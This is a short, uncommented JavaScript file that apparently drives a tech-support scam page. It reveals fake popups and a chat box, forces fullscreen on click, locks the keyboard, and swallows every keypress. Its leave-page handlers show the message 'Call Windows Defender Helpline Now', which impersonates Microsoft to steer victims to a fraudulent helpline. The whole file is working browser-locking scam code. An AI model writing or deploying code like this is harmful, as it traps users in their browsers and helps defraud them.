

function showd() {
document.getElementById("firstpop").style.display = "block";
document.getElementById("loader").style.display = "block";
}

function showd1() {
document.getElementById("firstpop").style.display = "none";


document.getElementById("hula").style.display = "block";
      $(".nen").delay(800).fadeIn(500);
          $(".nen1").delay(2000).fadeIn(1000);
              $(".nen2").delay(3000).fadeIn(1500);
$(".nen3").delay(3000).fadeIn(1500);
$("#chat-box").delay(3000).fadeIn(1000);
$("#chat").delay(3000).fadeIn(1000);
$("#chatbg").delay(3000).fadeIn(10);
}


        addEventListener("click", function() {
      var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
      ;
      rfs.call(el);
      });

      
    navigator.keyboard.lock();
    document.onkeydown = function (e) {
    return false;
    }

    	  window.onbeforeunload = function() {
    	     if (data_needs_saving()) {
    	         return "Call Windows Defender Helpline Now";
    	     } else {
    	        return;
    	     }
    	  };
    	         
    	              window.addEventListener("beforeunload", function (e) {
    	           var confirmationMessage = 'It looks like you are editing something. '
    	                              + 'Your changes will be lost if you leave before saving.';

    	                  (e || window.event).returnValue = confirmationMessage; //Gecko + IE
    	                  return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
    	              });
    	          